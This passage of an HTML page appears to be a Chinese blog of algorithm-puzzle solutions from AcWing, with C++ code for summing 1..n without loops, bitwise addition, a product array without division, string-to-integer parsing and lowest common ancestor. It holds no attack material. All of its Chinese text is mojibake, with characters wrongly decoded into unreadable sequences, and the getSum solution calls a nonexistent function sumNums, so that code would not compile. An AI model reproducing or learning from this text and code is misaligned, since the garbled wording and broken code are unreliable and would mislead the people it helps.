xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>+</mo><mn>2</mn><mo>+</mo><mo>â€¦</mo><mo>+</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1+2+â€¦+n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œè¦æ±‚ä¸èƒ½ä½¿ç”¨ä¹˜é™¤æ³•ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">for</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">while</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">hi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">if</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">else</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">se</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>w</mi><mi>i</mi><mi>t</mi><mi>c</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">switch</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">case</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal">se</span></span></span></span> ç­‰å…³é”®å­—åŠæ¡ä»¶åˆ¤æ–­è¯­å¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">?</mo><mi>B</mi><mo>:</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(A?B:C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">?</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>50000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 50000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">50000</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š10è¾“å‡ºï¼š55</code></pre><h3 id="è¯­æ³•é¢˜">è¯­æ³•é¢˜</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getSum</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    n &gt; <span class="number">0</span> &amp;&amp; (n += <span class="built_in">sumNums</span>(n - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³•â˜…"><a href="https://www.acwing.com/problem/content/81/">ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³•â˜…</a></h2><p>å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ä¸¤ä¸ªæ•´æ•°ä¹‹å’Œï¼Œè¦æ±‚åœ¨å‡½æ•°ä½“å†…ä¸å¾—ä½¿ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>ï¼‹ã€ï¼ã€</mtext><mo>Ã—</mo><mtext>ã€</mtext><mo>Ã·</mo></mrow><annotation encoding="application/x-tex">ï¼‹ã€ï¼ã€Ã—ã€Ã·</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">ï¼‹ã€ï¼ã€</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">ã€</span><span class="mord">Ã·</span></span></span></span> å››åˆ™è¿ç®—ç¬¦å·ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1000</mn><mo>â‰¤</mo><mi>n</mi><mi>u</mi><mi>m</mi><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mi>u</mi><mi>m</mi><mn>2</mn><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le num1,num2 \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šnum1 = 1 , num2 = 2è¾“å‡ºï¼š3</code></pre><h3 id="ç®—æ³•">ç®—æ³•</h3><p><strong>æ€è·¯</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1) å…¨åŠ å™¨çš„å®ç°</span><br><span class="line">    A   A 0 1 0 1</span><br><span class="line">+   B   B 0 0 1 1</span><br><span class="line">-----   C 0 1 1 0  </span><br><span class="line">  C D   D 0 0 0 1</span><br><span class="line">å³</span><br><span class="line">C = A ^ B        å¼‚æˆ–</span><br><span class="line">D = (A &amp; B) &lt;&lt; 1 ä¸, å·¦ç§»1ä½</span><br><span class="line">è¿ç®—å¯å¹¶è¡Œè®¡ç®—</span><br><span class="line"></span><br><span class="line">2) A + B = sum + carry, å¹¶ä¸”å¾ªç¯å¯ç»“æŸ. ç»“æŸæ—¶carry=0, sum = A + B</span><br><span class="line">è‹¥num1 &amp; num2ç»“æœæœ«å°¾ä¸­æœ‰kä¸ª0, åˆ™num2 = (num1 &amp; num2) &lt;&lt; 1æœ«å°¾æœ‰k+1ä¸ª0</span><br><span class="line">ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­(num1 &amp; num2) &lt;&lt; 1è‡³å°‘æœ‰k+2ä¸ª0, ...</span><br></pre></td></tr></table></figure><p><strong>ä»£ç </strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum, carry;</span><br><span class="line">    <span class="keyword">while</span> (num2) &#123;</span><br><span class="line">      sum = num1 ^ num2;</span><br><span class="line">      carry = (num1 &amp; num2) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">      num1 = sum;</span><br><span class="line">      num2 = carry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ„å»ºä¹˜ç§¯æ•°ç»„â˜…"><a href="https://www.acwing.com/problem/content/82/">æ„å»ºä¹˜ç§¯æ•°ç»„â˜…</a></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„<code>A[0, 1, â€¦, n-1]</code>ï¼Œè¯·æ„å»ºä¸€ä¸ªæ•°ç»„<code>B[0, 1, â€¦, n-1]</code>ï¼Œå…¶ä¸­Bä¸­çš„å…ƒç´ <code>B[i]=A[0]Ã—A[1]Ã— â€¦ Ã—A[i-1]Ã—A[i+1]Ã— â€¦ Ã—A[n-1]</code>ã€‚</p><p>ä¸èƒ½ä½¿ç”¨é™¤æ³•ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>20</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,20]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1, 2, 3, 4, 5]è¾“å‡ºï¼š[120, 60, 40, 30, 24]</code></pre><p><strong>æ€è€ƒé¢˜</strong>ï¼š</p><ul><li>èƒ½ä¸èƒ½åªä½¿ç”¨å¸¸æ•°ç©ºé—´ï¼Ÿï¼ˆé™¤äº†è¾“å‡ºçš„æ•°ç»„ä¹‹å¤–ï¼‰</li></ul><h3 id="æ›²çº¿æ•‘å›½">æ›²çº¿æ•‘å›½</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">multiply</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">    <span class="type">int</span> n = A.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">B</span><span class="params">(n)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// B[i] = (A[0]Ã—A[1]Ã—â€¦ Ã—A[i-1]) Ã— (A[i+1]Ã—â€¦Ã—A[n-1]), æ›²çº¿æ•‘å›½, åˆ†ä¸¤æ­¥èµ°</span></span><br><span class="line">    <span class="comment">// æ­¤å¾ªç¯ä¸­pè®°å½•çš„æ˜¯B[i]å·¦åŠéƒ¨åˆ†ä¹˜ç§¯</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, p = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">      B[i] = p;</span><br><span class="line">      p *= A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ­¤å¾ªç¯ä¸­pè®°å½•çš„æ˜¯B[i]å³è¾¹éƒ¨åˆ†ä¹˜ç§¯</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>, p = <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      B[i] *= p;</span><br><span class="line">      p *= A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> B;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°"><a href="https://www.acwing.com/problem/content/83/">æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°</a></h2><p>è¯·ä½ å†™ä¸€ä¸ªå‡½æ•° StrToIntï¼Œå®ç°æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°è¿™ä¸ªåŠŸèƒ½ã€‚</p><p>å½“ç„¶ï¼Œä¸èƒ½ä½¿ç”¨ atoi æˆ–è€…å…¶ä»–ç±»ä¼¼çš„åº“å‡½æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>20</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,20]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š&quot;123&quot;è¾“å‡ºï¼š123</code></pre><p><strong>æ³¨æ„</strong>:</p><p>ä½ çš„å‡½æ•°åº”æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼š</p><ol><li>å¿½ç•¥æ‰€æœ‰è¡Œé¦–ç©ºæ ¼ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªéç©ºæ ¼å­—ç¬¦ï¼Œå¯ä»¥æ˜¯ â€˜+/âˆ’â€™ è¡¨ç¤ºæ˜¯æ­£æ•°æˆ–è€…è´Ÿæ•°ï¼Œç´§éšå…¶åæ‰¾åˆ°æœ€é•¿çš„ä¸€ä¸²è¿ç»­æ•°å­—ï¼Œå°†å…¶è§£ææˆä¸€ä¸ªæ•´æ•°ï¼›</li><li>æ•´æ•°åå¯èƒ½æœ‰ä»»æ„éæ•°å­—å­—ç¬¦ï¼Œè¯·å°†å…¶å¿½ç•¥ï¼›</li><li>å¦‚æœæ•´æ•°é•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼Œåˆ™è¿”å› <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼›</li><li>å¦‚æœæ•´æ•°å¤§äº INT_MAX(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31} âˆ’ 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>)ï¼Œè¯·è¿”å› INT_MAXï¼›å¦‚æœæ•´æ•°å°äºINT_MIN(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">âˆ’2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span></span></span></span>) ï¼Œè¯·è¿”å› INT_MINï¼›</li></ol><h3 id="é¢˜è§£-13">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">strToInt</span><span class="params">(string str)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; str.<span class="built_in">size</span>() &amp;&amp; str[k] == <span class="string">&#x27; &#x27;</span>) k++;</span><br><span class="line">    </span><br><span class="line">    <span class="type">bool</span> is_minus = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (str[k] == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">      k++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (str[k] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      is_minus = <span class="literal">true</span>;</span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; str.<span class="built_in">size</span>() &amp;&amp; str[k] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; str[k] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">      num = <span class="number">10</span> * num + str[k] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (num &gt; INT_MAX) <span class="keyword">break</span>;</span><br><span class="line">      k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_minus) num *= <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (num &gt; INT_MAX) <span class="keyword">return</span> INT_MAX;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; INT_MIN) <span class="keyword">return</span> INT_MIN;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ ‘ä¸­ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆâ˜…"><a href="https://www.acwing.com/problem/content/84/">æ ‘ä¸­ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆâ˜…</a></h2><p>ç»™å‡ºä¸€ä¸ªäºŒå‰æ ‘ï¼Œè¾“å…¥ä¸¤ä¸ªæ ‘èŠ‚ç‚¹ï¼Œæ±‚å®ƒä»¬çš„æœ€ä½å…¬å…±ç¥–å…ˆã€‚</p><p>ä¸€ä¸ªæ ‘èŠ‚ç‚¹çš„ç¥–å…ˆèŠ‚ç‚¹åŒ…æ‹¬å®ƒæœ¬èº«ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>è¾“å…¥çš„äºŒå‰æ ‘ä¸ä¸ºç©ºï¼›</li><li>è¾“å…¥çš„ä¸¤ä¸ªèŠ‚ç‚¹ä¸€å®šä¸ä¸ºç©ºï¼Œä¸”æ˜¯äºŒå‰æ ‘ä¸­çš„èŠ‚ç‚¹ï¼›</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>äºŒå‰æ ‘[8, 12, 2, null, null, 6, 4, null, null, null, null]å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š    8   / \  12  2     / \    6   41. å¦‚æœè¾“å…¥çš„æ ‘èŠ‚ç‚¹ä¸º2å’Œ12ï¼Œåˆ™è¾“å‡ºçš„æœ€ä½å…¬å…±ç¥–å…ˆä¸ºæ ‘èŠ‚ç‚¹8ã€‚2. å¦‚æœè¾“å…¥çš„æ ‘èŠ‚ç‚¹ä¸º2å’Œ6ï¼Œåˆ™è¾“å‡ºçš„æœ€ä½å…¬å…±ç¥–å…ˆä¸ºæ ‘èŠ‚ç‚¹2ã€‚</code></pre><h3 id="é€’å½’æ³•-6">é€’å½’æ³•</h3><p>lowestCommonAncestorè¿”å›å€¼æ„ä¹‰</p><ol><li>è‹¥p,qéƒ½å±äºTree, åˆ™è¿”å›æœ€ä½å…¬å…±ç¥–å…ˆ</li><li>è‹¥åªæœ‰ä¸€æ–¹(å¦‚p)å±äºTree, åˆ™è¿”å›p</li><li>è‹¥ä¸¤è€…éƒ½ä¸å±äºTree, åˆ™è¿”å›null</li></ol><p>æ—¶é—´å¤æ‚åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>: æ¯ä¸ªç‚¹æœ€å¤šéå†ä¸€æ¬¡</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (root == p || root == q) <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">auto</span> left = <span 